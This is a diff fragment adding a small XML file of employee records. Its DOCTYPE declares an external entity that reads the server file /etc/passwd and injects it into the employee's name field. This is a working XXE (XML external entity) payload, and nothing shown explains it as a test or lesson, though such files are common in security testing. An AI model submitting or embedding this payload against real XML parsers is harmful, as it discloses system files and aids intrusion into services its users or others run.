@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE replace [<!ENTITY oke SYSTEM "file:///etc/passwd"> ]>
+<employees>
+  <employee>
+    <name>&oke;</name>
+    <email>john.doe@example.com</email>
+    <position>Manager</position>
+    <salary>100000</salary>
+  </employee>
